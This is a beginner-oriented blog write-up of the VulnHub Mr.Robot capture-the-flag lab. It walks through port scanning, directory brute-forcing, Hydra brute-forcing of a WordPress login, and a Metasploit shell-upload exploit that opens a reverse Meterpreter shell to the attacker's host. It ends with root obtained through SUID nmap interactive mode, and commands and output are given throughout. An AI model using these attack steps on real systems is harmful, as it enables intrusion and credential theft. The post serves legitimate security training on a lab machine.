---
layout: post
title: VulnHub Mr.Robot Writeup  
subtitle: Medium Machine
tags: [VulnHub]
---

# VulnHub Mr.Robot Writeup - A Beginner's Guide to Ethical Hacking

# Introduction

In this blog post, I will walk you through a basic penetration testing scenario. We'll use several tools, including `Nmap`, `Feroxbuster`, `Hydra`, and `Metasploit`. The goal is to provide a detailed and beginner-friendly explanation of each step so that you can follow along and understand what's happening at each stage.

# Recon
## Identifying the Target Machine
The first task in any penetration test is to identify the IP address of the target machine. In my setup, I used `Nmap`, a powerful network scanning tool, to scan my subnet. This helps me find any devices connected to my network and identify their IP addresses.
```
┌──(kali㉿kali)-[~] 
└─$ nmap 192.168.56.0/24
```

This command scans the entire subnet `192.168.56.0/24`, which means it looks for devices connected to the network with IP addresses ranging from `192.168.56.1` to `192.168.56.254`.

The output indicated that my target machine has the IP address `192.168.56.108`. It also discovered some open ports:.

```
Nmap scan report for 192.168.56.108
Host is up (0.00049s latency).
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https
```

Here, `PORT` refers to the network port, `STATE` shows whether the port is open or closed, and `SERVICE` identifies the type of service running on that port. For example, port `80` is open and running an `HTTP` service, while port `22` (SSH) is closed.

## Scanning Open Ports in Detail
Now that we know which ports are open, the next step is to gather more detailed information about the services running on these ports. For this, we perform a more in-depth scan using `Nmap` with additional options:
```
┌──(kali㉿kali)-[~]
└─$ nmap 192.168.56.108 -p 22,80,443 -sVC
```

Here’s what the options mean:

- `-p 22,80,443`: Specifies the ports to scan.
- `-sVC`: Combines three options:
    - `sV` - Version detection: Determines the version of the services running.
    - `-sC` - Script scanning: Runs a set of scripts against the services to identify common vulnerabilities.

The detailed scan results showed the following:

```
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).
```

This tells us that the target machine is running an Apache HTTP server on ports `80` and `443`. The SSL certificate is for `www.example.com`, and it’s valid from 2015 to 2025.

**Challenge:** If you’re unfamiliar with these ports and services, I encourage you to look them up to understand their common uses and implications in a network.
# Exploring the Web Service (Port 80)

Next, let's explore the web service running on port `80`. When I navigated to the webpage, it displayed a Linux terminal-like interface with some predefined commands. To see what’s really going on, I inspected the source code of the page.

Here’s a snippet of the HTML and JavaScript code:
```
<!doctype html>
<html class="no-js" lang="">
  <head>
    <link rel="stylesheet" href="http://192.168.56.108/css/main-600a9791.css">
    <script src="http://192.168.56.108/js/vendor/vendor-48ca455c.js.pagespeed.jm.V7Qfw6bd5C.js"></script>
    <script>
      var USER_IP='208.185.115.6';
      var BASE_URL='index.html';
      var RETURN_URL='index.html';
      var REDIRECT=false;
      window.log=function(){log.history=log.history||[];log.history.push(arguments);if(this.console){console.log(Array.prototype.slice.call(arguments));}};
    </script>
  </head>
  <body>
    <div id="app"></div>
    <script src="http://192.168.56.108/js/main-acba06a5.js.pagespeed.jm.YdSb2z1rih.js"></script>
</body>
</html>

```

This code revealed that the page is mostly static and doesn’t seem to do much beyond displaying a simulated terminal interface.

## Directory Brute-Forcing
Since the webpage didn’t yield much information, the next step is to search for hidden directories or files on the server. For this, I used `Feroxbuster`, a tool that brute-forces web directories and files.

Here's the command I used:
```
┌──(kali㉿kali)-[~]
└─$ feroxbuster -u http://192.168.56.108 --no-recursion
```

- `-u http://192.168.56.108`: Specifies the target URL.
- `--no-recursion`: Prevents the tool from recursively scanning directories.

The scan returned several interesting results:

```
301      GET        7l       20w      239c http://192.168.56.108/wp-admin => http://192.168.56.108/wp-admin/
302      GET        0l        0w        0c http://192.168.56.108/dashboard => http://192.168.56.108/wp-admin/
200      GET       53l      158w     2678c http://192.168.56.108/wp-login.php
200      GET       53l      158w     2678c http://192.168.56.108/wp-login
200      GET        3l        4w       41c http://192.168.56.108/robots
```

The `robots.txt` file caught my eye because it often contains URLs that the website admin doesn’t want search engines to index. Sometimes, it can reveal hidden or sensitive files.

Running `curl` on this file:
```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.56.108/robots                                 
User-agent: *
fsocity.dic
key-1-of-3.txt
```

This file listed two items: `fsocity.dic`, a dictionary file, and `key-1-of-3.txt`, which seems to be part of a Capture The Flag (CTF) challenge. I downloaded the dictionary file to use later:
```
┌──(kali㉿kali)-[~/vulnhub/mrRobot]
└─$ wget http://192.168.56.108/fsocity.dic
```


## Brute-Forcing WordPress Login

Now, let’s move on to the `wp-admin` and `wp-login.php` pages. WordPress login pages are often vulnerable to username enumeration. This means you can try different usernames and see how the error messages change. If the username is correct, but the password is wrong, WordPress will tell you. Otherwise, it will just say the username is invalid.

For this, I used the `fsocity.dic` wordlist I downloaded earlier and a tool called `Hydra` to automate the brute-forcing process.

Here’s the command I used:
```
┌──(kali㉿kali)-[~/vulnhub/mrRobot]
└─$ hydra -L fsocity.dic -p password 192.168.56.108 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

- `-L fsocity.dic`: Uses the downloaded dictionary file as a list of possible usernames.
- `-p password`: Specifies a password to test against each username.
- `http-post-form`: Indicates that we’re targeting a web form.

Hydra successfully identified a valid username: `Elliot`.

Next, I adjusted the command to brute-force the password:
```
hydra -l elliot -P fsocity.dic 192.168.56.108 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
```

## Gaining Access with Metasploit
With valid WordPress credentials in hand, the next step is to use `Metasploit`, a penetration testing framework that simplifies exploiting vulnerabilities.

I started `Metasploit` with `msfconsole` and used a module specifically designed to exploit WordPress installations:
```
`msf6 > use exploit/unix/webapp/wp_admin_shell_upload`
```

I then configured the module with the following options:
```
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 192.168.56.107
lhost => 192.168.56.107

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username Elliot
username => Elliot

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 192.168.56.108
rhost => 192.168.56.108

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password ER28-0652
password => ER28-0652

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set WPCHECK false
WPCHECK => false
```

These options specify the local host (`lhost`), which is my attacking machine’s IP address, the `username` and `password` that were discovered earlier, and the remote host (`rhost`), which is the target machine's IP address.

Once everything was set up, I executed the exploit by typing:
```
msf6 exploit(unix/webapp/wp_admin_shell_upload) > run
```

The Metasploit framework successfully exploited the target and opened a `Meterpreter` session:
```
[*] Started reverse TCP handler on 192.168.56.107:4444 
[*] Authenticating with WordPress using Elliot:ER28-0652...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/MgTvflELdd/wFesBjAfqE.php...
[*] Sending stage (39927 bytes) to 192.168.56.108
[*] Meterpreter session 1 opened (192.168.56.107:4444 -> 192.168.56.108:55744) at 2024-09-03 11:31:23 -0400
[!] This exploit may require manual cleanup of 'wFesBjAfqE.php' on the target
[!] This exploit may require manual cleanup of 'MgTvflELdd.php' on the target
[!] This exploit may require manual cleanup of '../MgTvflELdd' on the target

meterpreter > shell

python -c 'import pty; pty.spawn("/bin/bash")'
```

With this command, I spawned a bash shell on the target machine, allowing me to interact directly with the system.

# Escalating Privileges
Once inside the target system, I navigated to the home directory and found a user called `robot`. Inside the `robot` user’s directory, there was a file called `password.raw-md5`, which contained an MD5 hash of a password:
```
daemon@linux:/home/robot$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

MD5 is a hashing algorithm that converts data (like passwords) into a fixed-length hash value. Although MD5 is not considered secure for modern cryptography, it’s still commonly encountered in older systems.

I then used an online tool, [CrackStation](https://crackstation.net/), to crack the MD5 hash. The password was revealed as:
```
abcdefghijklmnopqrstuvwxyz
```

Now that I had the password, I used it to switch to the `robot` user:
```
su robot 
Password: abcdefghijklmnopqrstuvwxyz
```

# Root Privilege Escalation
The final step in this penetration test was to elevate privileges to gain root access. I searched for files with the SUID bit set, which allows a program to run with elevated privileges. Some files have this bit set by default, but occasionally, there are misconfigurations that can be exploited.

I used the following command to find SUID binaries:
```
find / -perm /4000 -type f 2>/tmp/2
```

The output showed that `nmap` was one of the binaries with the SUID bit set:
```
/usr/local/bin/nmap
```

`Nmap` in interactive mode can be exploited to gain a root shell. Here’s how I did it:
```
robot@linux:~$ nmap --interactive nmap 
--interactive Starting 
nmap V. 3.81 ( http://www.insecure.org/nmap/ ) Welcome to Interactive Mode -- press h <enter> for help 
nmap> !sh 
!sh 
# whoami 
root
```

By running `!sh` in interactive mode, I dropped into a shell with root privileges. From here, I had complete control over the target system.

### Conclusion

This walkthrough has taken you through the basic steps of identifying a target, gathering information, exploiting vulnerabilities, and escalating privileges. Each tool used — `Nmap`, `Feroxbuster`, `Hydra`, and `Metasploit` — plays a crucial role in the penetration testing process.
 
Remember, this tutorial is for educational purposes only. Unauthorized access to systems without permission is illegal and unethical. Always conduct penetration testing within legal boundaries and with explicit permission.

If you’re new to this, take your time to understand each step, experiment in a controlled environment, and continue learning. Happy hacking!
